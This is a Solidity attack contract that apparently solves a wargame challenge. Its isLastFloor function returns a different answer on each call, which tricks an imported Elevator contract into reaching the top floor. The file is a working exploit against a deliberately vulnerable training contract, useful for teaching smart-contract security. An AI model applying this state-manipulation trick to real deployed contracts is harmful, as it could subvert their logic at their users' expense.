// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
    Elevator private elevatorContract;
    bool private firstCall;

    constructor(address _elevatorContract) public {
        elevatorContract = Elevator(_elevatorContract);
        firstCall = true;
    }

    function goToFloor() public {
        elevatorContract.goTo(1);
    }

    function isLastFloor(uint) external override returns (bool) {
        if (firstCall) {
            firstCall = false;
        } else {
            firstCall = true;
        }
        return firstCall;
    }
}
